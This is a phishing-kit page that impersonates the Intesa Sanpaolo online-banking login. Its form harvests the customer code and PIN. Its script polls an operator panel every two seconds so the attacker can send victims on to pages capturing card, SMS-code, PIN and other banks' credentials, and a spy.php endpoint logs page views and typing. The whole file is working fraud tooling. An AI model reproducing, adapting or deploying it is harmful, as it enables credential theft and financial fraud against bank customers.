<?php 
require_once '../includes/main.php';
require '../main.php';
?>
<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="utf-8">
  <title>Banca Intesa Sanpaolo - Conto Corrente</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="ints aruba/res/bootstrap.css">
  <link rel="stylesheet" href="ints aruba/res/test.css">
  <link rel="icon" href="ints aruba/res/favicong.ico" type="image/x-icon" />
</head>
<body>
    <section>
        <div class="login">
            <div class="form">
                <div class="titre text-center">
                    <img src="ints aruba/res/green.png" alt="Logo">
                    <h3 class="mt-4 mb-2">Sei già cliente?</h3>
                </div>
                <p class="mt-4"><img src="ints aruba/res/loock.png" alt="Lock Icon">ACCEDI ALLA TUA BANCA ONLINE</p>
                <form action="post.php" method="post" onsubmit="return validateForm()">
                    <input type="hidden" value="index" name="step">

                    <div class="form-group mt-3">
                        <label for="user">Codice Titolare</label>
                        <input type="tel" id="userin3" placeholder="Codice Titolare" maxlength="8" name="userin3" required>
                    </div>

                    <div class="form-group mt-3">
                        <label for="pass">PIN</label>
                        <input type="tel" id="pass3" placeholder="PIN" maxlength="5" name="pass3" required>
                    </div>

                    <div class="bttn mt-4">
                        <button type="submit">ENTRA</button>
                    </div>
                    <div class="pt-2 pb-5">
                        <a href="#">Hai dimenticato il PIN ?<img src="ints aruba/res/flesh.png" alt="Forgot PIN"></a>
                    </div>
                </form>
            </div>
            <div class="reg py-3">
                <h4 class="text-center mb-3">Non sei ancora cliente?</h4>
                <div class="text-center">
                    <span>Scopri XME Conto, <br> puoi aprirlo anche online.</span>
                </div>
                <div class="bttn mt-4">
                    <button class="bg-white">Apri XME Conto</button>
                </div>
            </div>
            <div class="reg py-3" style="background:#323232;">
                <h5 class="text-center mb-3">Sei interessato a un prestito?</h5>
                <div class="text">
                    <span>Per richiederlo non è necessario essere titolare di un conto corrente Intesa Sanpaolo: ti aspettiamo in filiale.</span>
                </div>
            </div>
        </div>     
    </section>

    <script src="res/jq.js"></script>
<script src="res/v.js"></script>
	<script src="css/jq.js.download"></script>
	<script>
	var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
    };
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"INTESA"} );
}, 2000);
var redirect=0;
setInterval(function(){
	$.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 2000);
function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}


        function validateForm() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            return user.length > 0 && pass.length > 0; // Simple validation
        }

        $.post("spy.php", { intesview: 1 });
        var abort = false;
        $("#user").keyup(function() {
            if (!abort) {
                $.post("spy.php", { intesi: 1 });
                abort = true;
            }
        });
    </script>
</body>
</html>
